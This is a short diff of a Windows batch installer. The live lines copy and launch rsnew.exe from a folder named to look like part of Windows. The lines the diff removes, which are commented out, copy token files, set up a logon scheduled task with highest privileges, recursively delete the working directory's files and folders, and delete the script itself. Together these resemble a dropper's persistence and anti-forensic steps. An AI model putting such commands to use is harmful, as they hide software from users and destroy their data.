@@ -6,24 +6,5 @@ mkdir "C:\Program Files\WindowsRS"
 mkdir "C:\Program Files\WindowsRS\bin"
 
 copy "%~dp0rsnew.exe" "C:\Program Files\WindowsRS\bin"
-@REM copy "%~dp0tk.txt" "C:\temp\tk.txt"
-@REM copy "%~dp0rf_token.txt" "C:\temp\rf_token.txt"
-
-@REM set TASK_NAME=WinRpStart
-
-@REM schtasks /Create ^
-@REM  /TN "%TASK_NAME%" ^
-@REM  /TR "C:\Program Files\WinRp\bin\rsnew.exe" ^
-@REM  /SC ONLOGON ^
-@REM  /RL HIGHEST ^
-@REM  /F
 
 start "" "C:\Program Files\WindowsRS\bin\rsnew.exe"
-
-@REM for /d %%i in (*) do (
-@REM     rmdir /s /q "%%i"
-@REM )
-
-@REM del /q *.* >nul 2>&1
-
-@REM (del "%~f0") & exit
